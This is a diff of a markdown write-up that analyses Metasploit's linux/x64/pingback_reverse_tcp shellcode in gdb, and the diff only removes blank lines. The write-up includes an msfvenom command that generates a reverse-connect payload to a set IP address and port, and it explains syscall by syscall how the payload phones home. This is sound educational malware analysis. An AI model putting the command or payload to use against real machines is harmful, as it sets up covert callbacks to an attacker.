@@ -53,7 +53,6 @@ msfvenom -p linux/x64/pingback_reverse_tcp LHOST=192.168.1.170 LPORT=443 -f elf 
 # Payload size: 125 bytes
 # Final size of elf file: 245 bytes
 # Saved as: shellcode
-
 ```
 
 Next, we can start the analysis using `gdb`:
@@ -80,7 +79,6 @@ gdb -q ./shellcode
 #    0x400085:    push   0x1
 #    0x400087:    pop    rsi
 #    0x400088:    syscall
-
 ```
 
 The last command I issued (`x/12i $pc`) prints 12 instructions from the current program counter.
@@ -119,7 +117,6 @@ pop    rsi
 
 ; invoke sys_socket
 syscall
-
 ```
 
 They can be converted to the following C code:
@@ -130,7 +127,6 @@ RAX = socket(
   1,            // SOCK_STREAM
   0,            // IP protocol
 );
-
 ```
 
 It simply creates a new TCP socket. After that, we have the following instructions:
@@ -148,7 +144,6 @@ It simply creates a new TCP socket. After that, we have the following instructio
 #    0x4000a2:    push   0x2a
 #    0x4000a4:    pop    rax
 #    0x4000a5:    syscall
-
 ```
 
 The first instruction `tests` the value stored inside the register `RAX`, setting the appropriate flags.
@@ -168,7 +163,6 @@ In this case, if the value is signed, the instruction `js 0x4000ca` jumps to the
   #  0x4000cd:    push   0x1
   #  0x4000cf:    pop    rdi
   #  0x4000d0:    syscall
-
 ```
 
 It's simply a call to the syscall **0x3c **(`sys_exit`), which returns the exit code 1 (stored inside the register `RDI`).
@@ -201,7 +195,6 @@ pop    rax
 
 ; invoke sys_connect
 syscall
-
 ```
 
 They can be converted to the following C code:
@@ -214,7 +207,6 @@ myaddr.sin_port = htons(443);
 inet_aton("192.168.1.170", &amp;myaddr.sin_addr.s_addr);
 
 connect(RDI, (struct sockaddr*)RSI, 16);
-
 ```
 
 It simply creates a **sockaddr** structure that stores the IP address and the TCP port, along with address family (`AF_INET`, i.e. IPv4), and then it is passed to the function `connect`.
@@ -238,7 +230,6 @@ After the call to `sys_connect`, the following instructions are run:
 #    0x4000ba:    mov    rdi,rsp
 #    0x4000bd:    xor    rsi,rsi
 #    0x4000c0:    syscall
-
 ```
 
 Among the first instructions, there's a `pop rcx` that restores the old value of `RCX` (pushed by the instruction `0x40009b`).
@@ -275,7 +266,6 @@ xor    rsi,rsi
 
 ; invoke sys_nanosleep
 syscall
-
 ```
 
 These instructions can be converted to the following C code:
@@ -296,7 +286,6 @@ t.tv_sec = 5;
 t.tv_nsec = 0;
 
 nanosleep(&amp;t, NULL);
-
 ```
 
 It seems the shellcode sleeps **5 seconds** if it can't connect the remote socket.
@@ -315,7 +304,6 @@ After the call to `sys_nanosleep` there this:
 #    0x4000cd:    push   0x1
 #    0x4000cf:    pop    rdi
 #    0x4000d0:    syscall
-
 ```
 
 As you may notice, the shellcode uses the `POP` instruction 3 times:
@@ -338,7 +326,6 @@ time ./shellcode
 # user    0.00s
 # sys     0.00s
 # cpu     0%
-
 ```
 
 Anyway, let's go back to the address `0x4000ab`. If the call to `connect` is successful, then the shellcode jumps to the address `0x4000d2`, which points to these instructions:
@@ -355,7 +342,6 @@ Anyway, let's go back to the address `0x4000ab`. If the call to `connect` is suc
   #  0x4000ee:    inc    rax
   #  0x4000f1:    syscall 
   #  0x4000f3:    jmp    0x4000ca
-
 ```
 
 First, the register `RDX` is set to the value `0x10`, and after that the shellcode jumps straight to the address `0x4000ea`, which calls `sys_write`.
@@ -373,7 +359,6 @@ syscalll
 
 ; jump to the address 0x4000ca
 jmp 0x4000ca
-
 ```
 
 The instructions above can be translated to the following code:
@@ -386,7 +371,6 @@ write(
 );
 
 // jmp 0x4000ca
-
 ```
 
 The buffer containing the bytes that the shellcode is going to send to the remote server is stored at the address `0x4000da`, which is the return address of the current `call`.
@@ -397,14 +381,12 @@ In particular, the bytes are the following:
 (gdb) x/16xb 0x4000da
 # 0x4000da:       0xe4    0x92    0xe3    0xc8    0xa4    0xbb    0x41    0x53
 # 0x4000e2:       0xa8    0xfb    0x99    0x26    0xac    0x6c    0xd6    0x4c
-
 ```
 
 Since it's 16 bytes, hence 32 hex digits, the resulting buffer can be represented by the following hex string:
 
 ```txt
 e492e3c8a4bb4153a8fb9926ac6cd64c
-
 ```
 
 This string represents the so-called `Pingback UUID` of the shellcode. The source code from metasploit contains a reference to this value:
@@ -419,7 +401,6 @@ asm = %Q^
         db #{uuid_as_db}  ; PINGBACK_UUID
     ...
     ^
-
 ```
 
 Back to the instructions, right after the shellcode sends the Pingback UUID to the remote server, it jumps to the address `0x4000ca`, which, ad mentioned previously, leads to `sys_exit`, thus terminating the execution of the shellcode.
